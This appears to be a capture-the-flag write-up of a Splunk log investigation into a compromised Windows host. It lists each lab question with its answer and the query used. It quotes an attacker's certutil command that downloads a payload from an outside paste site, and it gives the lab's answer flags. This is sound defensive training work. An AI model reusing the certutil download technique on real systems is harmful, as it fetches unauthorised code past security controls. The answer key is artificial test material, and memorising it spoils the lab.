# Benign: Compromised Host Investigation Lab  

In this challenge, we investigated a compromised host based on logs from a Splunk instance. Below are the details of the investigation and findings, along with placeholders for screenshots to support each answer.  

---

### Network Segments
The network is divided into three logical segments, which are important for the investigation:

- **IT Department**
    - James
    - Moin
    - Katrina
- **HR Department**
    - Haroon
    - Chris
    - Diana
- **Marketing Department**
    - Bell
    - Amelia
    - Deepak

---

---

## 🔍 Investigation Questions and Answers  

### 1. How many logs were ingested from the month of March, 2022?  
**Answer:** 13,959  
- **Steps Taken:**  
  - Adjusted the calendar in Splunk to show only logs from March 2022.  
  - Queried the logs using the `index=win_eventlogs` filter for the correct time range.  

![Screenshot for Question 1](https://i.imgur.com/tYARG1s.png)

---

### 2. Imposter Alert: There seems to be an imposter account observed in the logs. What is the name of that user?  
**Answer:** Amel1a  
- **Steps Taken:**  
  - Analyzed the `UserName` field and cross-referenced the logs with a list of known users.  
  - Identified "Amel1a" as an imposter account resembling "Amelia."  

![Screenshot for Question 2](https://i.imgur.com/W7OX7Ju.png)

---

### 3. Which user from the HR department was observed to be running scheduled tasks?  
**Answer:** Chris.fort  
- **Steps Taken:**  
  - Used the query: `index=win_eventlogs UserName (Haroon OR Chris OR Diana) schtasks.exe`  
  - Identified that `Chris.fort` was running scheduled tasks in the HR department.  

![Screenshot for Question 3](https://i.imgur.com/FSofP45.png)

---

### 4. Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?  
**Answer:** Haroon  
- **Steps Taken:**  
  - Used the search query:  
    `index=win_eventlogs UserName (Haroon OR Chris OR Diana) | table CommandLine | dedup CommandLine`  
  - Found the command `certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe`, indicating Haroon downloaded the payload.  

![Screenshot for Question 4](https://i.imgur.com/Rm0p9tq.png)

---

### 5. To bypass the security controls, which system process (LOLBIN) was used to download a payload from the internet?  
**Answer:** certutil.exe  
- **Steps Taken:**  
  - Cross-referenced the system process used with the payload download.  
  - Identified that `certutil.exe` was used to bypass security controls and download the malicious file.  

![Screenshot for Question 5](https://i.imgur.com/luMRomf.png)

---

### 6. What was the date that this binary was executed by the infected host? (Format: YYYY-MM-DD)  
**Answer:** 2022-03-04  
- **Steps Taken:**  
  - Analyzed the event logs to determine the timestamp of the `certutil.exe` execution.  
  - Found the binary was executed on **2022-03-04**.  

![Screenshot for Question 6](https://i.imgur.com/F34HfAj.png)

---

### 7. Which third-party site was accessed to download the malicious payload?  
**Answer:** controlc.com  
- **Steps Taken:**  
  - Analyzed the URL associated with the payload download, which pointed to `https://controlc.com/e4d11035`.  
  - Identified that `controlc.com` was the third-party site used.  

![Screenshot for Question 7](https://i.imgur.com/CkhvVEc.png)

---

### 8. What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?  
**Answer:** benign.exe  
- **Steps Taken:**  
  - Reviewed the downloaded file from the C2 server.  
  - Identified that the file saved on the host was named `benign.exe`.  

![Screenshot for Question 8](https://i.imgur.com/p4dzMcd.png)

---

### 9. The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?  
**Answer:** THM{KJ&*H^B0}  
- **Steps Taken:**  
  - Used VirusTotal to analyze the malicious file URL.  
  - Identified the pattern `THM{KJ&*H^B0}` in the file's metadata.  

![Screenshot for Question 9](https://i.imgur.com/FcayIlP.png)

---

### 10. What is the URL that the infected host connected to?  
**Answer:** `https://controlc.com/e4d11035`  
- **Steps Taken:**  
  - Analyzed the logs for the full URL the infected host connected to during the attack.  
  - Identified that the infected host connected to `https://controlc.com/e4d11035`.  

---

## 🛠️ Tools Used  
- **Splunk**: For ingesting, analyzing, and searching logs.  
- **VirusTotal**: For analyzing suspicious URLs and files.  

---
